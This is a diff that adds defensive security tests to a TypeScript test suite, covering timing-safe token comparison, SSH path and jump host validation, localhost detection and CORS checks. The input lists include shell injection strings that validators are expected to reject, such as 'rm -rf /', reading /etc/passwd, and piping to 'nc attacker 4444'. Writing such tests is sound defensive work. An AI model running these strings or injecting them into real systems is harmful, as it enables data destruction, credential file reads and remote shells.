@@ -5,6 +5,7 @@
  */
 
 import { describe, expect, test } from "bun:test";
+import { timingSafeEqual } from "node:crypto";
 import {
   SafeText,
   SafePath,
@@ -449,5 +450,251 @@ describe("Edge Cases", () => {
       query: "search && rm -rf / ; cat /etc/passwd | nc attacker.com 1234",
     });
     expect(result.success).toBe(false);
+  });
+});
+
+// ============================================================================
+// Timing-Safe Comparison Tests (H4)
+// ============================================================================
+
+describe("Timing-Safe Token Comparison", () => {
+  /**
+   * Helper function mimicking the web-server's safeTokenCompare
+   */
+  function safeTokenCompare(provided: string, expected: string): boolean {
+    const providedBuf = Buffer.from(provided);
+    const expectedBuf = Buffer.from(expected);
+
+    if (providedBuf.length !== expectedBuf.length) {
+      timingSafeEqual(expectedBuf, expectedBuf);
+      return false;
+    }
+
+    return timingSafeEqual(providedBuf, expectedBuf);
+  }
+
+  test("returns true for matching tokens", () => {
+    const token = "super-secret-api-token-12345678901234567890";
+    expect(safeTokenCompare(token, token)).toBe(true);
+  });
+
+  test("returns false for different tokens of same length", () => {
+    const token1 = "token-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    const token2 = "token-bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
+    expect(safeTokenCompare(token1, token2)).toBe(false);
+  });
+
+  test("returns false for different length tokens", () => {
+    const short = "short";
+    const long = "this-is-a-much-longer-token";
+    expect(safeTokenCompare(short, long)).toBe(false);
+    expect(safeTokenCompare(long, short)).toBe(false);
+  });
+
+  test("returns false for empty vs non-empty", () => {
+    expect(safeTokenCompare("", "token")).toBe(false);
+    expect(safeTokenCompare("token", "")).toBe(false);
+  });
+
+  test("handles special characters", () => {
+    const token = "Bearer abc123-_=+/";
+    expect(safeTokenCompare(token, token)).toBe(true);
+  });
+});
+
+// ============================================================================
+// SSH Path Validation Tests (H1)
+// ============================================================================
+
+describe("SSH Key Path Validation", () => {
+  /**
+   * SSH dangerous characters pattern from server.ts
+   */
+  const SSH_DANGEROUS_CHARS = /[`$(){}|;&<>\\'"!]/;
+
+  test("rejects paths with shell metacharacters", () => {
+    const dangerousPaths = [
+      "~/.ssh/key$(whoami)",
+      "~/.ssh/key`id`",
+      "~/.ssh/key;rm -rf /",
+      "~/.ssh/key|cat /etc/passwd",
+      "~/.ssh/key&background",
+      "~/.ssh/key'quoted'",
+      '~/.ssh/key"double"',
+    ];
+
+    for (const path of dangerousPaths) {
+      expect(SSH_DANGEROUS_CHARS.test(path)).toBe(true);
+    }
+  });
+
+  test("accepts valid SSH key paths", () => {
+    const validPaths = [
+      "~/.ssh/id_ed25519",
+      "~/.ssh/id_rsa",
+      "~/.ssh/my-key",
+      "~/.ssh/project_deploy_key",
+    ];
+
+    for (const path of validPaths) {
+      expect(SSH_DANGEROUS_CHARS.test(path)).toBe(false);
+    }
+  });
+});
+
+// ============================================================================
+// SSH Jump Host Validation Tests (H2)
+// ============================================================================
+
+describe("SSH Jump Host Validation", () => {
+  /**
+   * Valid jump host pattern from server.ts
+   * Allows multiple hops with or without user@ prefix
+   */
+  const VALID_JUMP_HOST_PATTERN =
+    /^([a-zA-Z0-9_.-]+@)?[a-zA-Z0-9.-]+(:\d+)?(,([a-zA-Z0-9_.-]+@)?[a-zA-Z0-9.-]+(:\d+)?)*$/;
+  const SSH_DANGEROUS_CHARS = /[`$(){}|;&<>\\'"!]/;
+
+  test("accepts valid jump host formats", () => {
+    const validHosts = [
+      "bastion.example.com",
+      "user@bastion.example.com",
+      "user@bastion.example.com:2222",
+      "bastion.example.com:22",
+      "jump1,jump2",
+      "user@jump1.com,user@jump2.com",
+      "user@jump1.com:22,user@jump2.com:2222",
+    ];
+
+    for (const host of validHosts) {
+      expect(VALID_JUMP_HOST_PATTERN.test(host)).toBe(true);
+      expect(SSH_DANGEROUS_CHARS.test(host)).toBe(false);
+    }
+  });
+
+  test("rejects jump hosts with shell injection", () => {
+    const dangerousHosts = [
+      "host;rm -rf /",
+      "host$(whoami)",
+      "host`id`",
+      "host|nc attacker 4444",
+      'host -o ProxyCommand="nc attacker 4444"',
+      "host&background",
+    ];
+
+    for (const host of dangerousHosts) {
+      expect(SSH_DANGEROUS_CHARS.test(host)).toBe(true);
+    }
+  });
+
+  test("rejects invalid jump host formats", () => {
+    const invalidHosts = [
+      "", // empty
+      " ", // whitespace
+      "host with space",
+      "host\ttab",
+      "host\nnewline",
+    ];
+
+    for (const host of invalidHosts) {
+      const isValid = VALID_JUMP_HOST_PATTERN.test(host) && !SSH_DANGEROUS_CHARS.test(host);
+      expect(isValid).toBe(false);
+    }
+  });
+});
+
+// ============================================================================
+// Localhost Detection Tests (H3)
+// ============================================================================
+
+describe("Localhost Detection", () => {
+  /**
+   * Simulates the isLocalhostRequest logic from web-server.ts
+   */
+  function isLocalhostHost(host: string): boolean {
+    return (
+      host === "localhost" ||
+      host.startsWith("localhost:") ||
+      host === "127.0.0.1" ||
+      host.startsWith("127.0.0.1:") ||
+      host === "[::1]" ||
+      host.startsWith("[::1]:")
+    );
+  }
+
+  test("accepts valid localhost variations", () => {
+    const validLocalhost = [
+      "localhost",
+      "localhost:3333",
+      "127.0.0.1",
+      "127.0.0.1:8080",
+      "[::1]",
+      "[::1]:3333",
+    ];
+
+    for (const host of validLocalhost) {
+      expect(isLocalhostHost(host)).toBe(true);
+    }
+  });
+
+  test("rejects spoofed localhost attempts", () => {
+    const spoofedHosts = [
+      "localhost.attacker.com",
+      "localhost.evil.com:3333",
+      "127.0.0.1.attacker.com",
+      "127.0.0.1.evil.com:8080",
+      "attacker.com",
+      "192.168.1.1",
+      "10.0.0.1:3333",
+    ];
+
+    for (const host of spoofedHosts) {
+      expect(isLocalhostHost(host)).toBe(false);
+    }
+  });
+});
+
+// ============================================================================
+// CORS Origin Tests (M7)
+// ============================================================================
+
+describe("CORS Origin Validation", () => {
+  /**
+   * Pattern from web-server.ts (updated to include IPv6)
+   */
+  const localhostPattern = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?$/;
+
+  test("accepts localhost origins", () => {
+    const validOrigins = [
+      "http://localhost",
+      "http://localhost:3000",
+      "https://localhost",
+      "https://localhost:8080",
+      "http://127.0.0.1",
+      "http://127.0.0.1:3333",
+      "http://[::1]",
+      "http://[::1]:8080",
+    ];
+
+    for (const origin of validOrigins) {
+      expect(localhostPattern.test(origin)).toBe(true);
+    }
+  });
+
+  test("rejects non-localhost origins", () => {
+    const invalidOrigins = [
+      "http://example.com",
+      "http://localhost.attacker.com",
+      "http://attacker.localhost.com",
+      "http://192.168.1.1",
+      "http://10.0.0.1:3000",
+      "file://localhost",
+      "http://localhost:",
+      "http://localhost:abc",
+    ];
+
+    for (const origin of invalidOrigins) {
+      expect(localhostPattern.test(origin)).toBe(false);
+    }
   });
 });
